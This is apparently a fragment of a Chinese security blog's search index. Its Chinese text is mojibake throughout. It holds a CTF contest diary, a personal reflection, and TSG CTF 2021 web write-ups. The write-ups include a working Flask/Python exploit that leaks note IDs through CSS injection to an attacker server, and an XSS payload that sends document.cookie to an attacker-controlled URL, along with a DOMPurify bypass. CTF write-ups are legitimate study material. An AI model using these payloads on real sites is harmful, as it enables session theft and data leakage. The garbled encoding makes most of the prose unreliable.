è¿™æ˜¯æ™šä¸Šå›æ¥ä¹‹åæˆªçš„å›¾\nåº”è¯¥æœ‰å¾ˆå¤šé˜Ÿä¸ä¼šç”¨dockerçš„ç›¸å…³æ“ä½œåƒäºäº†ï¼Œç¬¬ä¸€è½®fixåªæœ‰å¾ˆå°‘çš„é˜Ÿè¿‡äº†checkï¼Œåˆ°ç¬¬äºŒè½®fixçš„æ—¶å€™è¿˜ç»™äº†dockerå¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤\nè¿™ä¸€åœºå’Œæ˜¨å¤©çš„é‚£åœºç»¼åˆä¸‹æ¥æˆ‘ä»¬æ˜¯8623åˆ†ï¼Œç¬¬äºŒåï¼Œæ‹¿ä¸€ç­‰å¥–~èŠœæ¹–\nç¬¬ä¸€åæ˜¯åŒ—å¤§çš„ä¸€ä¸ªå¤§ä½¬ï¼Œsoloå…¨åœºï¼Œttttttql\nå°ç»“ è¢«é˜Ÿé‡Œä¸¤ä¸ªå¸ˆå‚…å¸¦ç€ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæ£’çš„ ï¼Œå…è´¹åƒä½ çˆ½çš„ä¸€æ‰¹ï¼Œæ„Ÿè§‰çº¿ä¸‹æœ‰ä¸€ç¾¤äººæ‰“ctfæ˜¯ä¸ªæŒºèµ›åšæœ‹å…‹çš„äº‹æƒ…å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ\næ‰“ä¹‹å‰å…¶å®æ…Œçš„ä¸€æ‰¹ï¼Œæ¯•ç«Ÿè‡ªå·±webæ¯”è¾ƒèœï¼Œå®³æ€•æ‹‰è·¨ï¼Œå®³æ€•ç»™å¤§å®¶æ‹–åè…¿ï¼Œä¸è¿‡è¿˜å¥½æœ€åä¸€åˆ‡é¡ºåˆ©ï¼Œæ‹¿åˆ°äº†ä¸€ç­‰ï¼Œä¹‹å‰ä»ä¸æ•¢è®¾æƒ³çš„\né…¸èœæ£’æ£’é±¼yyds!!!!!!!!\nä»å¼€å§‹å­¦ctfï¼Œå­¦å®‰å…¨æ–¹é¢çš„çŸ¥è¯†åˆ°ç°åœ¨ä¹Ÿä¸è¿‡åŠå¹´å¤šä¸€ç‚¹ï¼Œå­¦çš„è¿˜æ˜¯ç›¸å½“ç²—ç³™çš„ï¼Œè§åˆ°çš„å¸ˆå‚…ä»¬éƒ½å­¦çš„æ—¶é—´æ¯”æˆ‘é•¿ï¼Œæ°´å¹³éƒ½æ¯”æˆ‘é«˜å¾ˆå¤šå¾ˆå¤š\næœªæ¥çš„è·¯è¿˜å¾ˆé•¿ï¼Œä¸ç®¡æ€ä¹ˆæ ·ï¼Œæˆ‘éƒ½ä¼šåšæŒèµ°ä¸‹å»çš„ã€‚\n","date":"2021-10-18T20:38:54+08:00","permalink":"https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/","section":"posts","tags":[],"title":"2021å¼ºç½‘æ¯é’å°‘èµ›çº¿ä¸‹èµ›å‚èµ›è®°å½•"},{"categories":["CTF"],"contents":"https://score.ctf.tsg.ne.jp/challenges | https://ctftime.org/event/1431/tasks/\nWeb/Welcome to TSG CTF! We want to welcome you, seriously.\næŠ“åŒ…åå‘ç°æˆ‘ä»¬è¾“å…¥çš„å€¼æ˜¯postçš„jsonä¸­çš„keyéƒ¨åˆ†è€Œä¸æ˜¯valueï¼Œå¾ˆå¥‡æ€ª\nç»™äº†æºç ï¼Œçœ‹ä¸‹app.js\n11è¡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œè¦é€šè¿‡å®ƒï¼Œå¯ä»¥æŠŠbodyç½®ç©ºè®¿é—®ï¼ˆç”¨burpçš„è¯è¦æ”¹ä¸€ä¸‹Content-Typeï¼Œé»˜è®¤çš„application/jsonæ˜¯ä¸èƒ½ç½®ç©ºçš„ï¼‰ï¼Œtypeof null === 'object'\n$ curl \u0026#34;http://34.84.69.72:34705/\u0026#34; -X POST {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Cannot read property \u0026#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\u0026#39; of null\u0026#34;} flagä¼šåœ¨æŠ¥é”™ä¸­å‡ºç°ï¼\nTSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\nWeb/Udon Ta-dah! Here comes udon!\nUdon Noteï¼Œä¸€çœ¼xssä¹‹ç±»çš„\næˆ‘ä»¬å‘å‡ºå»çš„noteä¸­çš„å°–æ‹¬å·ä¼šè¢«è½¬ä¹‰ä¸ºå®ä½“å­—ç¬¦ï¼ŒResetä¼šæ¸…ç©ºcookieï¼Œè¿å¸¦ç€æ¶ˆå¤±ä¹‹å‰å‘å¸ƒè¿‡çš„Note\næœ‰Tell Admin About This Udon Noteçš„é€‰é¡¹\nâ€”â€”â€”â€”æ²¡ä»€ä¹ˆæƒ³æ³• ä»¥ä¸‹æ˜¯å¹³æ·¡çš„å¤ç°è¿‡ç¨‹\nçœ‹æºç ï¼Œmain.go\næˆ‘ä»¬éœ€è¦æ‰¾åˆ°é‚£ä¸ªç‰¹æ®Šçš„notes_id\næ¥ç€å¾€ä¸‹çœ‹\nhttpçš„ç›¸åº”å¤´å¯ä»¥æ³„éœ²ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæ˜¯å…¥æ‰‹ç‚¹\nä»…åœ¨Firefoxä¸­æœ‰ä¸€ä¸ªLinkè¯·æ±‚å¤´ï¼Œå‡ ä¹ç­‰åŒäºHTMLä¸­çš„\u0026lt;link\u0026gt;æ ‡ç­¾\nLink: \u0026lt;/foo.css\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/foo.css\u0026#34;\u0026gt; æˆ‘ä»¬å¯ä»¥å‘appä¸­çš„ä»»æ„ä¸€é¡µæ³¨å…¥ä»»æ„çš„css\nåŒæ—¶ä¹Ÿæœ‰éœ€è¦Bypassçš„åœ°æ–¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„CSPç­–ç•¥style-src 'self'\næˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„cssçš„noteï¼Œå†å°†è¿™ä¸ªnoteçš„é“¾æ¥æ”¾å…¥Linkè¯·æ±‚å¤´ä¸­\nhttp://ip:port/?k=Link\u0026amp;v=%3C%2F(\u0026lt;URL of a note with styles to inject\u0026gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22 # exp.py from flask import Flask, request import requests import urllib.parse import string TARGET_BASE = \u0026#34;http://localhost:8080\u0026#34; LEAK_LENGTH = 10 CHAR_CANDIDATES = string.ascii_letters + string.digits EXPLOIT_BASE_ADDR = \u0026#34;http://host.docker.internal:1337\u0026#34; app = Flask(__name__) s = requests.Session() def build_payload(prefix: str, candidates: \u0026#34;List[str]\u0026#34;): global EXPLOIT_BASE_ADDR assert EXPLOIT_BASE_ADDR != \u0026#34;\u0026#34;, \u0026#34;EXPLOIT_BASE_ADDR is not set\u0026#34; payload = \u0026#34;{}\u0026#34; for candidate in candidates: id_prefix_to_try = prefix + candidate matcher = \u0026#39;\u0026#39;.join(map(lambda x: \u0026#39;\\\\\u0026#39; + hex(ord(x)) [2:], \u0026#39;/notes/\u0026#39; + id_prefix_to_try)) payload += \u0026#34;a[href^=\u0026#34; + matcher + \\ \u0026#34;] { background-image: url(\u0026#34; + EXPLOIT_BASE_ADDR + \\ \u0026#34;/leak?q=\u0026#34; + urllib.parse.quote(id_prefix_to_try) + \u0026#34;); }\u0026#34; return payload def post_note(title: str, description: str) -\u0026gt; str: r = s.post(TARGET_BASE + \u0026#34;/notes\u0026#34;, data={ \u0026#34;title\u0026#34;: title, \u0026#34;description\u0026#34;: description, }, headers={ \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34; }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return r.headers[\u0026#39;Location\u0026#39;].split(\u0026#39;/notes/\u0026#39;)[-1] def report_note_as_stylesheet(id: str) -\u0026gt; None: header_value = \u0026#39;\u0026lt;/notes/{}\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34;\u0026#39;.format(id) r = s.post(TARGET_BASE + \u0026#34;/tell\u0026#34;, data={ \u0026#34;path\u0026#34;: \u0026#34;/?k=Link\u0026amp;v={}\u0026#34;.format(urllib.parse.quote(header_value)), }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return None @app.route(\u0026#34;/start\u0026#34;) def start(): p = build_payload(\u0026#34;\u0026#34;, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: started exploit with a new note: {}/notes/{}\u0026#34;.format(TARGET_BASE, exploit_id)) return \u0026#34;\u0026#34; @app.route(\u0026#34;/leak\u0026#34;) def leak(): leaked_id = request.args.get(\u0026#39;q\u0026#39;) if len(leaked_id) == LEAK_LENGTH: print(\u0026#34;[+] leaked (full ID): {}\u0026#34;.format(leaked_id)) r = s.get(TARGET_BASE + \u0026#34;/notes/\u0026#34; + leaked_id) print(r.text) else: print(\u0026#34;[info] leaked: {}{}\u0026#34;.format( leaked_id, \u0026#34;*\u0026#34; * (LEAK_LENGTH - len(leaked_id)))) p = build_payload(leaked_id, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: invoked crawler with a new note: \u0026#34; + exploit_id) return \u0026#34;\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;[info] running app ...\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=1337) è¯¦ç»†å†…å®¹å‚è§-\u0026gt;wp\nWeb/Beginner\u0026rsquo;s Web 2021 Made drunk, so solved drunk.\nç»™äº†æºç ï¼Œçœ‹ä¸‹index.jsï¼Œemmmmmmï¼Œåˆ›å»ºäº†session.routes\nä½†æ˜¯flagå¹¶ä¸ä¼šåœ¨æœ€åæ¸²æŸ“çš„routeä¸­å‡ºç°\næ‰€ä»¥æˆ‘ä»¬æƒ³åˆ©ç”¨GetSaltå¤„çš„session.salt='flag'æ¥è½¬åˆ°flagçš„è·¯ç”±ä¸Šæ¥è·å¾—flag\nä½†æ˜¯[salt]ä¼šå¯¼è‡´é‡å†™flagï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„sessionæ˜¯è¿™æ ·çš„çŠ¶æ€\nsession = { routes: { flag: ..., index: ..., ... [salt]: ..., // salt is anything different from \u0026#39;flag\u0026#39; }, salt: \u0026#39;flag\u0026#39;, } é¦–å…ˆç”¨GET /?action=SetSalt\u0026amp;data=flagæ¥è®©salt='flag'ï¼Œsessionä¼šå˜æˆè¿™æ ·\nsession = { route: { flag: ...,\t// this route is overwritten and not accessible index: ..., ... flag: ...,\t// here is salt }, salt: \u0026#39;flag\u0026#39;, } æˆ‘ä»¬æƒ³å›å¤åˆ°routeåªæœ‰ä¸€ä¸ªflagå¹¶ä¸”å¯è¾¾çš„çŠ¶æ€ï¼Œä½†æ˜¯åˆä¸æƒ³åˆ é™¤æ‰salt: 'flag'\nå…³é”®ä¹‹å¤„åœ¨äºset_saltï¼Œå®ƒæƒ³å®Œæˆçš„ä»»åŠ¡æ˜¯ä¸€èµ·æ›´æ–°routeså’Œsaltçš„å€¼\nset_salt: async (salt) =\u0026gt; { session.routes = await setRoutes(session, salt); session.salt = salt; return \u0026#39;ok\u0026#39;; } ç¬¬äºŒè¡Œä¸­ï¼Œæˆ‘ä»¬è¦await setRoutesï¼Œç›¸å½“äº\nset_salt: (salt) =\u0026gt; { return setRoutes(session, salt).then((result) =\u0026gt; { session.routes = result; session.salt = salt; return \u0026#39;ok\u0026#39;; }); } è¿™é‡Œä¼šè¦åˆ°ä¸€ä¸ªsetRoutesçš„è¿”å›å€¼result\nconst setRoutes = async (session, salt) =\u0026gt; { const index = await fs.readFile(\u0026#39;index.html\u0026#39;); session.routes = { // redacted [salt]: () =\u0026gt; salt, }; return session.routes; }; å¾ˆæ²¡å¿…è¦çš„æ“ä½œï¼Œåˆä¸€ésetRoutesï¼Œçº¯å±è„±è£¤å­æ”¾å±\nå½“æˆ‘ä»¬è®¾ç½®salt = 'then'æ—¶ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†\n{ //redacted then: () =\u0026gt; salt, } è¿™ä¸ªç‰¹æ®Šçš„thenå…³é”®å­—ä¸€å‡ºæ¥ï¼Œå°±å¾ˆç‰¹æ®Šï¼Œè§£é‡Šå™¨ä¼šè¯•å›¾æŠŠå®ƒè®¤ä½œæ˜¯awaitä¸­è¦è°ƒç”¨çš„thençš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰awaitéœ€è¦å®ƒè¿™ä¸ªthenæ‰§è¡Œçš„resultæ¥ä½œä¸ºè¿”å›å€¼ï¼Œå°±å¡æ­»åœ¨è¿™é‡Œäº†ï¼Œè¿™ä¸ªsaltæ— å¤„å¯å»\nSoï¼ŒGET /?action=SetSalt\u0026amp;data=thenä¹‹åsessionå°†æ˜¯è¿™æ ·çš„\nsession = { routes: { flag: ..., index: ..., ... then: ..., }, salt: \u0026#39;flag\u0026#39;, } åªè¦GET /?action=GetSaltå³å¯ï¼Œå› ä¸º\nreturn session.routes[route](data);\t// route = session.salt here (just flag) å…·ä½“æ“ä½œä¸€å¼ åŠ¨å›¾å°±èƒ½è¯´æ¸…æ¥š\næœ€åï¼Œè¿™ä¸ª**çš„ä¸œè¥¿å­¦åå«Thenable Objectï¼Œè°¢è°¢ä½ ï¼ŒjavascriptğŸ˜…\nå‚è€ƒï¼šwp\nWeb/Giita Gibson Les Paul Standard.\nSteal Cookie.\nğŸ˜­ğŸ˜­ğŸ˜­åˆæ˜¯cookie\nçœ‹æºç ï¼Œapp.js\n11è¡Œçš„æ­£åˆ™åŒ¹é…äº†ç©ºæ ¼ã€å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä½†æ˜¯å¤šä½™äº†ä¸€ä¸ª.\nä¼šæŠŠthemeæ”¾è¿›å»è¿›è¡Œä¸€ä¸ªè¿‡æ»¤\nç„¶åæ‹¼æ¥åˆ°stylesheet linkä¸­ï¼Œå°±å†æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤äº†\næˆ‘ä»¬å¯ä»¥æ³¨å…¥åˆ°hrefè¿™é‡Œï¼Œæ¯”å¦‚\n\u0026lt;!-- theme=x%20onerror%3Dalert --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=x onerror=alert\u0026gt; è¦å®Œæ•´çš„æ³¨å…¥jsä»£ç ï¼Œæˆ‘ä»¬éœ€è¦cheat DOMPurify\nDOMPurifyä¼šå…ˆæ£€æµ‹å¯¹è±¡åœ¨ä¸åœ¨DOMPurify.isSupportedçš„èŒƒå›´å†…\næ‰€ä»¥å‘¢ï¼Œæˆ‘ä»¬æŠŠå®ƒç»™å…³å’¯\ndelete document.implementation.__proto__.createHTMLDocument æœ€åçš„Payloadï¼ŒU+00A0(NBSP)ä¸åœ¨htmlçš„ç©ºç™½ç¬¦ä¸­ï¼Œä½†æ˜¯åœ¨Javascriptçš„ç©ºç™½ç¬¦ä¸­\naxios({ method: \u0026#39;post\u0026#39;, url: `http://${host}:${port}/`, headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, data: qs.encode({ theme: \u0026#39;x onerror=delete\\xA0document.implemenation__proto__.createHTMLDocument\u0026#39;, title: \u0026#39;x\u0026#39;, body: `\u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;location.href\u0026#34;=\u0026#39;${url}?\u0026#39; + document.cookie\u0026gt;`, }), }); å®Œæ•´å‚è§-\u0026gt;wp\nå°±æ˜¯èœ ä¸ä¼šåš å‹‰å¼ºçœ‹çœ‹wp è¿˜ä¸ä¸€å®šçœ‹å¾—æ‡‚\né“åºŸç‰©äº†ğŸ˜…\n","date":"2021-10-04T16:44:41+08:00","permalink":"https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/","section":"posts","tags":["wp"],"title":"TSGCTF2021 Wp"},{"categories":[],"contents":"å•Šå·²ç»ä¸­ç§‹äº†å‘¢ï¼Œè·ç¦»è¿‡18å²ç”Ÿæ—¥æ•´æ•´6ä¸ªæœˆäº†ã€‚è¿‡å»çš„ç‚¹ç‚¹æ»´æ»´ï¼ŒçœŸæ˜¯å†å†åœ¨ç›®ã€‚\n4åˆ°6æœˆï¼Œä¸å¤šè¯´ã€‚ä»7æœˆä¹‹åï¼Œäº‹åœ¨æ¨ç€äººèµ°ï¼Œå¤ªå¿«äº†ï¼Œå¾€å¾€ä¸ç­‰ç€æˆ‘æ²‰æ·€ä¸€ä¸‹å°±å¿…é¡»é¢å¯¹ï¼Œè¯´å®è¯ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œæ˜¯æœ‰ç‚¹è¿‡è½½äº†ï¼Œç”šè‡³æ˜¯æœ‰ç‚¹æ ˆæº¢å‡ºã€‚æˆ‘ä»æ²¡æœ‰æƒ³è¿‡æˆ‘çš„å¤§äºŒå¼€å­¦ç¬¬ä¸€ä¸ªæœˆæ˜¯è¿™æ ·çš„ï¼ŒæŠ€æœ¯æ–¹é¢å·®çš„å¤ªå¤šï¼Œç”Ÿæ´»ä¸Šåˆä¸èƒ½å¾ˆå¥½çš„å…¼é¡¾ï¼Œå­¦æ ¡è¿™è¾¹åˆæœ‰ä¸€äº›é—®é¢˜æ˜¯éšæ‚£ã€‚åˆæ¢å¤åˆ°äº†å­¤ç‹¬æ˜¯å¸¸æ€çš„çŠ¶æ€ä¸‹ï¼Œå¿ƒå¢ƒå´ä¸å¤ä»å‰ã€‚æ˜¯ï¼Œä¸€åˆ‡éƒ½å¯ä»¥å½’ç»“ä¸ºæƒ³çš„å¤ªå¤šåšçš„å¤ªå°‘ï¼Œå¯æ˜¯å¹¶æ²¡æœ‰å®Œå…¨ç›¸åŒçš„äººç”Ÿç»å†å¯ä»¥å‚è€ƒï¼Œæ¯ä¸ªäººçš„æƒ…å†µéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ã€‚ä¸Šå‘¨æ¯å¤©å µæ™šé«˜å³°çš„æ—¶å€™åœ¨è½¦ä¸Šæ€»ä¼šæ€è€ƒä¸€äº›ä¸œè¥¿ï¼Œå¤©é©¬è¡Œç©ºçš„ã€‚æˆ‘é€‰æ‹©äº†è¿™ä¸ªä¸“ä¸šï¼Œæˆ‘çœŸçš„æ˜¯è¿™å—æ–™å—ï¼Ÿæˆ‘çš„èƒ½åŠ›å¤Ÿå—ï¼Ÿæˆ‘èƒ½ç»·å¾—ä½å—ï¼Ÿè°åˆèƒ½ç»™æˆ‘è§£ç­”å‘¢ï¼Ÿæˆ‘å¾ˆå®³æ€•æˆ‘æ˜¯ä¸ªå®é™…å­¦ä¹ èƒ½åŠ›å¾ˆå·®çš„äººï¼Œæ˜¯ä¸ªåªä¼šæè¡¨é¢åŠŸå¤«çš„äººï¼Œä½†æˆ‘çŸ¥é“æˆ‘åˆéå¸¸çš„è¦å¼ºè¦é¢å­ï¼Œç”šè‡³ä¼šå› ä¸ºå®³æ€•åˆ«äººçš„çœ‹æ³•è€Œä¸å»å°è¯• ä¸å»è¯•é”™ã€‚\nä¸‹åˆé›¨è¿‡å¤©æ™´ï¼Œçœ‹äº‘ï¼Œçœ‹å¤©ï¼Œæƒ³åˆ°é‚£å¥è¯â€”â€”äººç”Ÿå¦‚é€†æ—…ï¼Œæˆ‘äº¦æ˜¯è¡Œäººã€‚åŒ†åŒ†18å¹´èµ°è¿‡ï¼Œå¤ªå¤šçš„äººç»è¿‡æˆ‘çš„äººç”Ÿï¼Œå¤§å¤šå¹¶æ²¡æœ‰æ€èµ·æ³¢æ¾œï¼Œä»…æœ‰çš„é‚£ä¸€ä¸ª æœ€åä¹Ÿåªæ˜¯åœç•™ç‰‡åˆ»ä¾¿ç¦»å»ï¼Œæˆ–è®¸ç¼˜åˆ† æœ¬å°±ç»ˆæœ‰å°½æ—¶ã€‚ç°åœ¨é«˜å¼ºåº¦çš„å­¦ä¹ å·¥ä½œä¹‹ç±»çš„äº‹æƒ…è®©æˆ‘æ— æš‡é¡¾åŠè¿™äº›ï¼Œåœ¨ç´¯çš„ç­‹ç–²åŠ›å°½ä¹‹åå°±ä¸€ä¸ªäººå›å‘³ä¸€ä¸‹è‹¦æ¶©ï¼ŒæŠŠæƒ³åˆ†äº«çš„å–œæ‚²å‹åœ¨å¿ƒé‡Œã€‚æ— èŠçš„æ—¶å€™ç¿»ç¿»çŸ¥ä¹å¾®åšå’Œqqç©ºé—´ï¼Œåˆ·åˆ·æç¬‘æ®µå­ï¼Œçœ‹åˆ°å¼€å¿ƒçš„äº‹æƒ…è‡ªå·±å¯¹ç€å±å¹•æ†¨æ†¨çš„ç¬‘ä¸€ç¬‘ï¼Œä¹Ÿå°±è¿™æ ·äº†ï¼Œæ²¡æœ‰å¯ä»¥åˆ†äº«çš„å¯¹è±¡ï¼Œæ²¡æœ‰åŒä»½åŠ ç³–å»å†°çš„å¿«ä¹ã€‚å¯èƒ½å¹´çºªå¤§äº†äººå°±æ›´å®¹æ˜“æ„Ÿä¼¤ï¼Ÿæ˜æ˜ä¹‹å‰æ—©å°±ä¹ æƒ¯äº†ä¸€ä¸ªäººçš„çŠ¶æ€ï¼Œè‡ªåœ¨æ¸…å‡€ï¼Œæ˜æ˜å¾ˆæ—©å°±è®¤è¯†ä¹ æƒ¯äº†ä¸å­¤ç‹¬å¸¸ä¼´ï¼Œä½†è¿˜æ˜¯ä¼šå¶å°”å¤šæ€ï¼Œå¸Œæœ›æœ‰äººèƒ½å¤Ÿæ‡‚æˆ‘ï¼Œâ€œçœ‹åˆ°æˆ‘â€ã€‚å¯èƒ½æ‹§å·´åˆå‚²å¨‡çš„æ€§æ ¼å°±æ³¨å®šå•èº«å§ï¼Œä¸Šå¤´ä»¥åæ€»ä¼šè¯ä¸è¾¾æ„ï¼Œç­‰ç€åˆ«äººæ¥å¯¹è„‘ç”µæ³¢ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘ä¸å¤Ÿä¼˜ç§€ï¼Œä¸å¤Ÿå¥½ï¼Œå“ˆã€‚äººç”Ÿæ¼«æ¼«ï¼Œè®¸å¤šäº‹æƒ…è°åˆèƒ½çœ‹çš„é€å½»å‘¢ï¼Ÿå½“æ˜ç™½è¿‡æ¥çš„æ—¶å€™æœ‰äº›ä¸œè¥¿æ—©å·²æ¶ˆå¤±åœ¨äººæµ·ï¼Œä¸€æ—¦é”™è¿‡å°±ä¸åœ¨å§ã€‚\né’±éš¾æŒ£ï¼Œä¸€ä¸ªå›´åŸåˆ°å¦ä¸€ä¸ªå›´åŸã€‚è¿™å‡ å¤©è·Ÿçˆ¶æ¯æ‰“ç”µè¯ï¼Œä»–ä»¬éƒ½ç‰¹åˆ«å¼€å¿ƒçœ‹åˆ°æˆ‘ç°åœ¨å‘å±•çš„æ ·å­ï¼Œæˆ‘çœ‹åˆ°ä»–ä»¬å¼€å¿ƒæˆ‘ä¹Ÿå¾ˆå¼€å¿ƒã€‚ä»–ä»¬è™½ç„¶ä¸æ‡‚ä¸“ä¸šä¸Šçš„äº‹æƒ…ï¼Œä½†æ˜¯ä»–ä»¬äº†è§£æˆ‘ï¼Œæ€»èƒ½åšæˆ‘æœ€åçš„é¿é£æ¸¯ã€‚å› ä¸ºå¤ªç´¯äº†ä¸æƒ³åŠ¨ï¼Œä¸¤æ¬¡æ‰“ç”µè¯éƒ½åœ¨å®¿èˆé‡Œèººç€ï¼Œå‡ ä¸ªæ™ºéšœå®¤å‹å°±åœ¨é‚£é‡Œä¸åœåœ°ç¬‘æˆ‘ï¼Œè®¥ç¬‘ï¼Œå¯èƒ½è¿™å°±æ˜¯äººä¸Šäººå§ã€‚æœ‰æ—¶å€™çœ‹åˆ°å¯æ‚²çš„ä»–ä»¬ï¼Œå¯¹è‡ªå·±ä¹Ÿæ˜¯ä¸€ç§æ·±åˆ»çš„å†…çœï¼Œæé†’è‡ªå·±ä¸è¦èµ°äº†å¼¯è·¯ï¼Œä¸è¦è™šåº¦æ—¶å…‰ï¼Œä¸è¦ç­‰ä»¥åè¿½æ‚”è«åŠï¼Œæé†’è‡ªå·±ä¸è¦å˜æˆè‡ªå·±è®¨åŒçš„äººã€‚\næ™šä¸ŠæŠŠæ‰“è½¦çš„ç”µå­å‘ç¥¨å¼€äº†ä¸€ä¸‹ï¼Œå°±æˆ‘ä¸€ä¸ªäººçš„å°±æœ‰248å—å¤šï¼Œè¿˜ä¸åŒ…å«é˜Ÿå‹æ‰“çš„ã€‚æˆ‘ä¸€å‘æ˜¯å¯¹é‡‘é’±æ²¡ä»€ä¹ˆæ¦‚å¿µçš„ï¼Œç‹¬ç”Ÿå­ï¼Œæƒ³è¦ä»€ä¹ˆéƒ½æœ‰ï¼Œä¹Ÿå°±ä»€ä¹ˆéƒ½ä¸æƒ³è¦ï¼Œé’± èŠ±å°±å®Œäº†ï¼Œæ²¡ä»€ä¹ˆçœŸå®çš„ä½“ä¼šã€‚å‡ºè¡Œçš„é’±ï¼Œåƒé¥­çš„é’±ï¼Œç”Ÿæ´»çš„é’±ï¼Œä»¥åè¿˜å¿…å®šæœ‰ä½å®¿çš„é’±ï¼Œæˆ‘æ‰ªå¿ƒè‡ªé—®ï¼Œæ­¥å…¥ç¤¾ä¼šåæˆ‘èƒ½è‡ªå·±å…»äº†è‡ªå·±å—ï¼Ÿåœ¨æˆ‘çš„è®¡åˆ’ä¸­æ²¡æœ‰è€ƒç ”çš„é€‰é¡¹ï¼Œæ„å‘³ç€æˆ‘å¿…é¡»å»é¢å¯¹è¿™äº›ï¼Œé‚£ä¸€å¤©å¾ˆå¿«å°±ä¼šæ¥ï¼Œæˆ‘èƒ½åšçš„åˆ°å—ï¼Ÿæˆ‘èƒ½åšçš„å¥½å—ï¼Ÿæˆ‘ä¼šå¾—åˆ°åˆ«äººçš„è®¤å¯å—ï¼Ÿ å­¦å®‰å…¨çš„ï¼Œæˆ–è€…è¯´å­¦è®¡ç®—æœºç›¸å…³ä¸“ä¸šçš„ï¼Œè°æ²¡æœ‰ä¸€é¢—æƒ³æˆä¸ºå…¨æ ˆçš„å¿ƒï¼Ÿæœ€å¼€å§‹åªæ˜¯åšåšctfå…¥é—¨ï¼Œç°åœ¨åˆæ¸´æœ›åšçº¢é˜Ÿï¼Œåˆæƒ³åšå®‰å…¨ç ”ç©¶ã€‚å®³æ€•è‡ªå·±ä»€ä¹ˆéƒ½å­¦ï¼Œä»€ä¹ˆåˆéƒ½å­¦ä¸å¥½ã€‚æ—¶é—´è¶Šé•¿ï¼Œè§åˆ°çš„ è®¤è¯†åˆ°çš„å¤§ä½¬ä»¬å°±è¶Šå¤šï¼Œä»–ä»¬å¤§éƒ½å…¥è¡Œæ—©ï¼Œåˆå¾ˆæœ‰å¤©èµ‹ï¼Œæ•™äººç¾¡ç…ä¸å·²ã€‚ä¸æ˜¯å¯¹è‡ªå·±æ²¡ä¿¡å¿ƒï¼Œå””ï¼Œæˆ‘è¯´ä¸å¥½ã€‚ä¸€ç›´ä»¥æ¥å¤šå°‘æœ‰ç‚¹è‡ªå‘½ä¸å‡¡çš„æƒ³æ³•ï¼Œä½†æ˜¯å­¦çš„è¶Šä¹…è¶Šæ„è¯†åˆ°è‡ªå·±çš„å¹³å‡¡ä¸æ™®é€šï¼Œåªæ˜¯ä¸‡åƒæ¸ºå°ä¸­çš„ä¸€ä¸ªã€‚å¿ƒä¸­çš„ä¿¡å¿µå’Œåšå®ˆè¿˜åœ¨ï¼Œå¸Œæœ›ä¸ä¼šè¢«å¤–ç•Œçš„ä»»ä½•å¹²æ‰°ç»™ç£¨å¹³ã€‚å¤§ä¸‰çš„ä¸€ä¸ªå­¦é•¿ï¼Œé‚£å¤©ç»™æˆ‘å‘å¾®ä¿¡è¯´ï¼Œå¾ˆå«‰å¦’æˆ‘ç°åœ¨çš„å­¦ä¹ çŠ¶æ€ï¼Œä»–åœ¨ç»å†ä¸€äº›äº‹ä¹‹åäººå·²ç»ç£¨å¹³äº†ã€‚ä»–æœ€è¿‘hvvä¹Ÿå®Œå…¨æ˜¯è‡ªé—­çš„çŠ¶æ€ã€‚æˆ‘ä¸çŸ¥é“è¯´ä»€ä¹ˆå¥½ï¼Œä»–ä¼¼ä¹æŠŠè‡ªå·±å®Œå…¨å°èµ·æ¥äº†ï¼Œå¾ˆä¸å¥½çš„çŠ¶æ€ã€‚ä½†æ˜¯çœ‹åˆ«äºº æ€»ä¼šçœ‹åˆ°è‡ªå·±ï¼Œåªèƒ½ä¸æ–­çš„æé†’è‡ªå·±ï¼Œè®¤æ¸…å½¢åŠ¿ï¼Œè®¤æ¸…çŠ¶å†µï¼Œå†å†·é™ä¸€ç‚¹ã€‚\næ„Ÿè§‰è¯´å‡ºæ¥èˆ’æœå¤šäº†ï¼Œæ— 